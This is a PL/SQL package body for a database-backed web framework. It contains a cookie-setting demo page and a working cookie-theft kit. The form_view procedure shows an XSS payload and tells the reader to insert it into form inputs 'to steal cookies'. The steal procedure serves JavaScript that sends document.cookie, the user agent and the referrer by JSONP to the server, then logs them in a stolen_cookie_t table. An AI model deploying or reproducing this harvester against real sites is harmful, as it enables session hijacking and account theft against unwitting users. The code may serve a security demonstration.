create or replace package body cookie_h is

	procedure form_view is
		n varchar2(100);
		v varchar2(999);
	begin
		src_b.header;
		x.l('<link>', '[bootstrap.css]');
		x.o('<div.container>');
		if not r.is_null('name') then
			h.set_cookie(r.getc('name'),
									 r.getc('value'),
									 domain => r.getc('domain'),
									 path => r.getc('path'),
									 httponly => r.getb('httponly'),
									 secure => r.getb('secure'));
			--r.setc('c$' || r.getc('name'), r.getc('value'));
		elsif not r.is_lack('delname') then
			for i in 1 .. r.cnt('delname') loop
				tmp.s := r.getc('delname', idx => i);
				h.set_cookie(tmp.s, r.getc('c$' || tmp.s), httponly => false, expires => trunc(sysdate - 1));
			end loop;
		end if;
	
		if r.method = 'POST' then
			h.refresh(1, r.prog);
			return;
			h.go(r.prog);
		end if;
	
		x.f('<form method=post>', r.prog);
		x.o('<fieldset>');
		x.p('<legend>', 'set cookie');
	
		x.o(' <div.form-group>');
		x.p('  <label>', 'set-cookie name');
		x.s('  <input.form-control type=text,name=name>');
		x.c(' </div>');
	
		x.o(' <div.form-group>');
		x.p('  <label>', 'set-cookie value');
		x.s('  <input.form-control type=text,name=value>');
		x.c(' </div>');
	
		x.o(' <div.form-group>');
		x.p('  <label>', 'set-cookie domain');
		x.s('  <input.form-control type=text,name=domain>');
		x.c(' </div>');
	
		x.o(' <div.form-group>');
		x.p('  <label>', 'set-cookie path');
		x.s('  <input.form-control type=text,name=path>');
		x.c(' </div>');
	
		x.o(' <div.checkbox>');
		x.p('  <label>', x.s('<input type=checkbox,name=httponly>') || 'http only');
		x.c(' </div>');
	
		x.o(' <div.checkbox>');
		x.p('  <label>', x.s('<input type=checkbox,name=secure>') || 'secure');
		x.c(' </div>');
	
		x.s(' <input.btn.btn-primary type=submit>');
		x.c('</fieldset>');
		x.c('</form>');
	
		x.o('<div.well style=white-space:pre>');
		x.t('<script>document.write(document.cookie.replace(/;/g,";\n"));</script>');
		x.c('</div>');
	
		x.o('<div.well style=white-space:pre>');
		if r.is_lack('cookie') then
			x.p('<p>', 'insert the following text into form input to steal cookies');
			x.p('<p>', x.e(x.r('<script src="@cookie_h.steal"></script>', r.dir_full)));
		else
			x.p('<p>', 'stolen cookie');
			x.t(r.getc('cookie'));
		end if;
		x.c('</div>');
	
		x.t('<hr/>');
		x.p('<h4>', '## This is all http request cookies');
		x.f('<form method=post>', r.prog);
		n := ra.params.first;
		x.o(' <ol>');
		loop
			exit when n is null;
			if n like 'c$%' then
				v := ra.params(n) (1);
				x.p('<li>', x.v('<input type=checkbox,name=delname>', substrb(n, 3)) || ' ' || n || ' : ' || v);
			end if;
			n := ra.params.next(n);
		end loop;
		x.c(' </ol>');
		x.s(' <input.btn.btn-default type=submit>');
		x.c('</form>');
	
	end;

	procedure steal is
		v stolen_cookie_t%rowtype;
	begin
		if r.is_lack('cookie') then
			-- gen script content
			x.t(x.r('
			$.ajax("@",{
			  dataType: "jsonp",
				data: {
					cookie:document.cookie,
					ua:navigator.userAgent,
					referer:document.referrer
				}	
			});
			',
							r.url_full));
		else
			-- got stealed info
			v.logtime := sysdate;
			v.referer := r.getc('referer');
			v.cookies := r.getc('cookie');
			v.ua      := r.getc('ua');
			insert into stolen_cookie_t values v;
		end if;
	end;

end cookie_h;
/
